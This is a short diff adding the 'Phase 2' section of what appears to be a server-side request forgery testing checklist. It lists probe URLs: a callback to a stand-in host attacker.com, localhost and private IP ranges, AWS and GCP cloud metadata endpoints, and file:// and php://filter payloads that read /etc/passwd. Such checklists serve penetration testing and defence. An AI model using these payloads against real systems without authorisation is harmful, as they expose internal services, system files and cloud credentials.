@@ -1,0 +1,13 @@
+**Phase 2: Basic SSRF Confirmation**
+- Test with controlled server (Burp Collaborator, interactsh, ngrok):
+  - `http://attacker.com/ssrf-test`
+  - Observe DNS/HTTP callback
+- Test internal IP ranges:
+  - `http://127.0.0.1/`, `http://localhost/`
+  - `http://169.254.169.254/` (AWS metadata)
+  - `http://metadata.google.internal/` (GCP)
+  - `http://10.0.0.1/`, `http://192.168.1.1/`
+- Test different protocols:
+  - `file:///etc/passwd`
+  - `gopher://`, `dict://`, `ftp://`, `ldap://`
+  - `php://filter/convert.base64-encode/resource=/etc/passwd`
